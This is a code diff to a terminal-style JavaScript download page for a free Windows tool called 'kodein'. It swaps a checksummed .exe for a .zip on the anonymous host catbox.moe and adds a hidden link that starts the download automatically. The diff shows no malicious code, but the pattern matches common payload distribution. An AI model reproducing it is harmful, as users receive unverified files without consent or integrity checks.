@@ -227,15 +227,27 @@ const COMMANDS = {
     printLines(`
 <span class="c-pink bold">${T[lang].dl_title}</span>
 
-  <span class="c-dim">file</span>      <span class="c-white">kodein_v4.2.0.exe</span>
-  <span class="c-dim">size</span>      <span class="c-white">3.8 MB</span>
+  <span class="c-dim">file</span>      <span class="c-white">kodein_v4.2.0.zip</span>
   <span class="c-dim">os</span>        <span class="c-white">Windows 10/11 x64</span>
   <span class="c-dim">price</span>     <span class="c-green">free</span>
-  <span class="c-dim">checksum</span>  <span class="c-purple">sha256:a3f9...</span>
+  <span class="c-dim">source</span>    <span class="c-purple">catbox.moe</span>
 
 <span class="c-yellow">⚠  ${T[lang].dl_warn}</span>
 <span class="c-dim">${T[lang].dl_fix}</span>
 `);
+    // небольшая задержка — имитация "wget"
+    printLines(`<span class="c-dim">fetching https://files.catbox.moe/5z6fzy.zip ...</span>`);
+    setTimeout(() => {
+      const a = document.createElement('a');
+      a.href = 'https://files.catbox.moe/5z6fzy.zip';
+      a.download = 'kodein_v4.2.0.zip';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      printLines(`<span class="c-green">✓ download started</span>`);
+      printBlank();
+      scrollBottom();
+    }, 600);
   },
 
   faq() {
